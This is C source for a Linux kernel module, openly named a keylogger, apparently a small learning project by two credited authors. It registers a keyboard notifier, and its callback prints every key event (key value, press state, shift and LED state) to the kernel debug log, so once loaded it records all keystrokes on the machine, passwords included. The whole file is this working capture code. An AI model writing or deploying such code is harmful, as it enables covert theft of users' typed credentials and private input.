#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
MODULE_LICENSE("GPL");


/*
	keyboard_notifier_callback
	must be of the type notifier_fn_t(notifier_block *nb,
									  unsigned long action, void *data)
*/
int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
	struct keyboard_notifier_param *kb = data;

	printk(KERN_DEBUG "Activity: %lu", action);
	printk(KERN_DEBUG "kb->down: %d", kb->down);
	printk(KERN_DEBUG "kb->shift: %d", kb->shift);
	printk(KERN_DEBUG "kb->ledstate: %d", kb->ledstate);
	printk(KERN_DEBUG "kb->value: %d", kb->value);

	return 0;
} 

static struct notifier_block nb;

static int __init init_keylogger(void){
	nb.notifier_call = keyboard_notifier_callback;
	register_keyboard_notifier(&nb);

	return 0;
}

static void __exit exit_keylogger(void){
	unregister_keyboard_notifier(&nb);
}

module_init(init_keylogger);
module_exit(exit_keylogger);